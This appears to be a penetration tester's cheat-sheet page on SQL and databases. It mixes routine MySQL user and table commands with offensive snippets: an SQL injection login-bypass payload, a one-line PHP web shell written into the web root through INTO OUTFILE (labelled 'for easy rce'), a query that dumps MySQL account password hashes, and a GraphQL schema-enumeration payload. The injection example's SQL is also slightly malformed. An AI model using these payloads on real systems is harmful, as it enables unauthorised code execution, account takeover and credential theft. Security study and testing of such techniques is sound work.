# SQL/Databases
SQL is a standard language for storing, editing and retrieving data in databases. A query can look like so:

**SELECT \* FROM users WHERE username = :username AND password := password**

If we have our username as admin and our password as: **' or 1=1 -- -** it will insert this into the query and authenticate our session.

**SELECT \* FROM users WHERE username = admin AND password := ' or 1=1 -- -**

The extra SQL we inputted as our password has changed the above query to break the initial query and proceed (with the admin user) if 1==1, then comment the rest of the query to stop it breaking.

To create/alter a user or change a users perms, use: 

[https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql](https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql) 

```text-plain
CREATE USER 'sammy'@'localhost' IDENTIFIED BY 'password';
CREATE USER 'openemr_user'@'%' IDENTIFIED BY 'Password12';
ALTER USER 'sammy'@'localhost' IDENTIFIED WITH mysql_native_password BY 'password';
GRANT PRIVILEGE ON database.table TO 'username'@'host';
GRANT ALL PRIVILEGES ON openemr.* TO 'openemr_user'@'%';
DROP USER 'username'@'localhost'; # to delete a user
```

To create a table,  use:

```text-plain
CREATE TABLE MyGuests (
id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
firstname VARCHAR(30) NOT NULL,
lastname VARCHAR(30) NOT NULL,
email VARCHAR(50),
reg_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) 
```

for easy rce, use:

```text-plain
select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
```

To see current users and their passwords, use:

```text-plain
SELECT CONCAT('''',user,'''@''',host,'''') dbuser,password FROM mysql.user;
```

For graphql enum, use this payload [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumerate-database-schema-via-introspection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumerate-database-schema-via-introspection) 

```text-plain
{"query":"{\n victims {\n filename\n id\n key\n name\n timer\n }\n}"}
```